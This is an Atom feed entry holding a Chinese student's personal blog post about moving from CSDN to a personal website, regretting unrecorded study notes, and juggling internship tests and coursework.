    <content type="html"><![CDATA[<h2 id="关于我为什么要做个人网站"><a href="#关于我为什么要做个人网站" class="headerlink" title="关于我为什么要做个人网站"></a>关于我为什么要做个人网站</h2><p>之前是一直在csdn上面进行博客记录，社区型的，大家都一样，<strong>没有个性</strong>的那种，在年级的大佬群里面看到各个大佬都有自己的个人网站，而且看起来<strong>非常养眼</strong>，多少有点羡慕。说实话，在csdn上面都没有记录自己学习经历的欲望。在蓝杰的时候老师总是让我们写博客，我一直觉得这是一种作业，多少感觉有点浪费时间。直到现在，我开始准备找实习，准备写简历，准备回顾之前的知识的时候，<strong>哦豁！之前学的东西好多都模糊了，很多都没有记录，这时我才感觉到博客记录的重要性，寄！</strong> 不过还好现在再开始应该还来得及，毕竟现在才大二。</p><hr><h2 id="将来的打算"><a href="#将来的打算" class="headerlink" title="将来的打算"></a>将来的打算</h2><p>目前是打算将技术性的东西或者一些学习上的感想记录在个人网站上，如果有项目的话再将项目传到github上，然后在网站上附上链接，这样子</p><hr><h2 id="网站完善中"><a href="#网站完善中" class="headerlink" title="网站完善中"></a>网站完善中</h2><p>今天就简单把框架搭建了一下，具体的细节打算之后有时间再弄，现在是很多东西都没有加上去，只能先将就用着了，反正现在也就我一个人看，13号字节笔试，14号阿里笔试。。。实在是没有时间耗了，学校还有课程，花旗杯有个项目，微信小程序+springboot还要学<br>大概就先这样吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我为什么要做个人网站&quot;&gt;&lt;a href=&quot;#关于我为什么要做个人网站&quot; class=&quot;headerlink&quot; title=&quot;关于我为什么要做个人网站&quot;&gt;&lt;/a&gt;关于我为什么要做个人网站&lt;/h2&gt;&lt;p&gt;之前是一直在csdn上面进行博客记录，社区型的，大家都一样，</summary>
      
    
    
    
    
    <category term="随笔" scheme="http://example.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
